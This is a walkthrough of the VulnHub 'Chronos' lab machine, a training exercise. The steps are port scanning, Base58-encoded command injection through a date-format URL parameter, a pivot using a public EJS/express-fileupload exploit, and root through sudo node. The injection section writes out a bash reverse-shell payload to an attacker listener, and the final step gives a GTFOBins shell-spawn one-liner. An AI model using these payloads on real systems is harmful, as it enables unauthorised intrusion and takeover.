Target: 10.0.0.35
Difficulty: Medium
Source: https://www.vulnhub.com/entry/chronos-1,735/

## ***NMAP***

    $ nmap -sS -T4 -p- 10.0.0.35

    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    8000/tcp open  http-alt

## ***HTTP | PORT 80 / 8000***

![image](https://user-images.githubusercontent.com/76552238/158429168-ed529255-c7e4-4c02-9a24-c130ed79fe61.png)

Going to http://10.0.0.35, we don't have functionally, comments or anything that might help us. Brute forcing the directories doesn't find anything either.
Going to the source code, we can find this line:

![image](https://user-images.githubusercontent.com/76552238/158429770-4cf517fd-3411-4ef8-a625-8721a065ac6d.png)

<!--http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL-->

Adding "10.0.0.35 chronos.local" to /etc/hosts and going to the specified url, it seems we don't have permission to access this page.

![image](https://user-images.githubusercontent.com/76552238/158429994-25ff75a7-3792-4f35-8d88-4d498b3af739.png)

Going to ***http://chronos.local:8000*** we can see that the date and time is being specified, probably the 'date' command used in Linux.

![image](https://user-images.githubusercontent.com/76552238/158430123-55936e80-45d4-47fe-84a2-6c0d7c4ea01f.png)

We can try to decode the string that is been passed in the url. Let's try decoding is using Base64.

    $ echo '4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL' | base64 -d

![image](https://user-images.githubusercontent.com/76552238/158430605-184d299d-3148-4fca-a773-375f7b79fd60.png)

This string isn't encoded using Base64. I found a site that find a message encoding. ***https://www.dcode.fr/cipher-identifier***

![image](https://user-images.githubusercontent.com/76552238/158430958-b9e8cbc4-ec91-4d0d-ac73-054b4cff151b.png)

Let's try to decode the string using Base58.

    $ echo '4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL' | base58 -d

![image](https://user-images.githubusercontent.com/76552238/158431092-b2e67916-b49f-4244-9bd2-276efe6efb43.png)

<!-- 4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL Base58 Decode: 
'+Today is %A, %B %d, %Y %H:%M:%S.' -->

    %A - Day
    %B - Month
    %d - day (number_
    %Y - Year
    %H - Hour
    %M - Minute
    %S - Second

Turns out, this string format can be used with the 'date' command in Linux.

    $  date '+Today is %A, %B %d, %Y %H:%M:%S.'

![image](https://user-images.githubusercontent.com/76552238/158431286-f1cf7685-ce61-4759-b782-2373c4b43e7a.png)

This means we can inject a command and start a reverse shell. Since we don't have permission to access ***'chronos.local:8000/data/'***, we can execute RCE from ***'chronos.local:8000'*** using the network tab in developer tools. Let try to run the 'ls' command on the machine.

    $ echo '; ls' | base58

    2WfAHp

![image](https://user-images.githubusercontent.com/76552238/158438588-81fcda71-42da-4b78-9edf-e307c17b11d5.png)


![image](https://user-images.githubusercontent.com/76552238/158438144-c9b15d18-c986-4395-9c72-f3984530c2f3.png)

By decoding ";bash -c 'bash -i >& /dev/tcp/10.0.0.27/4444 0>&1'" with Base58  and send it, we can open a reverse shell on our local machine.

    ;bash -c 'bash -i >& /dev/tcp/10.0.0.27/4444 0>&1'

    Base58 Encode:
    jSQFn3DG86mbq9wJvQ3UZztDFRqBaqKWp7w5ghvh2eChdyAGQsPJeHXYmg6ECpV2itHc

![image](https://user-images.githubusercontent.com/76552238/158438542-6771bc8f-6439-4248-b0fe-cdf8e31d8d74.png)

![image](https://user-images.githubusercontent.com/76552238/158438764-958f36cf-ee5d-4c60-bb02-459a3de38603.png)

### ***Local Machine:***

![image](https://user-images.githubusercontent.com/76552238/158438922-4757de8d-5962-4b6a-b681-543bc6f74885.png)

## ***PRIVILEGE ESCALATION***

We are logged in as the user 'www-data'. Going to the home directory we can find a user ---> 'imera'.

![image](https://user-images.githubusercontent.com/76552238/158439207-3eb42641-d777-4e8f-8908-0ae672dcd27b.png)

We don't have permissions to view the directory.  
At this point I got stuck for a bit, I searched for some exploits but found none. After some digging around I the directory **/opt/chronos-v2/backend** which seemed interesting.

![image](https://user-images.githubusercontent.com/76552238/158439432-1601e880-5e24-4229-aab6-72432b76a8b8.png)


### ***/opt/chronos-v2/backend/package.json:***

    "name": "some-website",
    "version": "1.0.0",
    "description": "",
    "main": "server.js",
    "scripts": {
        "start": "node server.js"
    },
    "author": "",
    "license": "ISC",
    "dependencies": {
        "ejs": "^3.1.5",
        "express": "^4.17.1",
        "express-fileupload": "^1.1.7-alpha.3"
    }

It stats that "express-fileupload" is being used. 'express-fileupload' is a way to upload and download files in Node.js. I of course searched if it has any vulnerabilities and found this github repository ***https://github.com/boiledsteak/EJS-Exploit***.

### ***Remote Machine:***

![image](https://user-images.githubusercontent.com/76552238/158442157-9d13699b-3230-4818-9096-bf743c7a83ba.png)

### ***Local Machine:***

![image](https://user-images.githubusercontent.com/76552238/158442263-96476c09-aae8-47da-a6eb-e09be4a554f5.png)

By downloading and executing the exploit on victim machine and listening on my local machine, we are able to get a reverse shell as the user 'imera'.

We now have permission to go the /home/imera directory and read 'user.txt'.

> ### ***/home/imera/user.txt:***                                                                                      
![image](https://user-images.githubusercontent.com/76552238/158442524-733ceedb-980a-4fea-a1d8-1f9122b14c8c.png)

Let's see if the user is part of the sudo group.

    $ sudo -l

    Matching Defaults entries for imera on chronos:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User imera may run the following commands on chronos:
        (ALL) NOPASSWD: /usr/local/bin/npm *
        (ALL) NOPASSWD: /usr/local/bin/node *

I searched online for 'linux node command privilege escalation' and found an article from GTFOBins ***https://gtfobins.github.io/gtfobins/node/***.

    $ sudo node -e 'child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'

![image](https://user-images.githubusercontent.com/76552238/158442877-5c81fb45-f0c7-40c2-945f-b038105b985a.png)

### ***/root/root.txt:***

![image](https://user-images.githubusercontent.com/76552238/158443013-5d4cdab7-d071-4b1b-8f8a-87a368ac43e9.png)
